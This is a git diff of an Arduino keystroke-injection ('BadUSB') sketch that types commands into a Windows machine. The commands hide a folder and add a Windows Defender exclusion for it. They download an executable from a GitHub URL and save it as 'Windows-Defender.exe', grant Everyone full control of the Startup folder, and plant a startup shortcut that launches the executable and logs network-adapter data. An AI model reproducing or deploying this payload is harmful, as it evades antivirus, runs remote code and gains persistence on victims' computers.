@@ -1,5 +1,4 @@
 #include "Keyboard.h"
-#define  MENU_KEY 0xED
 
 void typeKey(uint8_t key)
 {
@@ -43,16 +42,15 @@ void setup()
 
   delay(300);
 
-  Keyboard.print(F("MKDIR \"%USERPROFILE%\\Desktop\\system\" & cd \"%USERPROFILE%\\Desktop\\system\" & attrib +s +h \"%USERPROFILE%\\Desktop\\system\" & powershell"));
+  Keyboard.print(F("Icacls \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /grant Everyone:(OI)(CI)F /T & MKDIR \"%USERPROFILE%\\Desktop\\system\" & cd \"%USERPROFILE%\\Desktop\\system\" & attrib +s +h \"%USERPROFILE%\\Desktop\\system\" & powershell"));
 
   typeKey(KEY_RETURN);
 
   delay(400);
 
-  // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created
+  // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created and create the shortcut for the program
 
-  Keyboard.print(F("$stopwatch =  [system.diagnostics.stopwatch]::StartNew();$seconds = $stopwatch.Elapsed.TotalSeconds; Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://www.github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows-Defender.exe\"); $seconds1 = $stopwatch.Elapsed.TotalSeconds;$seconds1 - $seconds"));  
-
+  Keyboard.print(F("$WshShell = New-Object -comObject WScript.Shell;  $Shortcut = $WshShell.CreateShortcut(\"$env:PROGRAMDATA\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\test.lnk\"); $Shortcut.TargetPath = \"C:\\Windows\\System32\\cmd.exe\"; $Shortcut.Arguments = '/min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows-Defender.exe\"'; $Shortcut.Save();Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://www.github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows-Defender.exe\");"));  
 
   typeKey(KEY_RETURN);
 
@@ -66,43 +64,9 @@ void setup()
 
   delay(200);
 
-  // This will allow everyone full acess over Startup directory, which is nessecary to run the shortcut
-
-  Keyboard.print(F("Icacls \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" /grant Everyone:(OI)(CI)F /T & cd \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" & start ."));
+  Keyboard.print(F("cd \"%PROGRAMDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\""));
 
   typeKey(KEY_RETURN);
-
-  delay(1500);
-
-  Keyboard.press(MENU_KEY);
-
-  Keyboard.releaseAll();
-  
-  Keyboard.print(F("w"));
-  
-  Keyboard.print(F("s"));
-
-  typeKey(KEY_RETURN);
-
-  delay(1500);
-
-  // Script for shortcut:
-
-  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows-Defender.exe\""));
-
-  typeKey(KEY_RETURN);
-
-  delay(600);
-
-  Keyboard.print(F("test"));
-
-  typeKey(KEY_RETURN);
-
-  delay(900);
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(119);
-  Keyboard.releaseAll();
 
   delay(300);
 
@@ -147,7 +111,7 @@ void setup()
   Keyboard.press(KEY_TAB);
   Keyboard.releaseAll();
 
-  delay(2300);
+  delay(5300);
 
   // Deleting the other cmd after removing the exclusion from windows defender
 
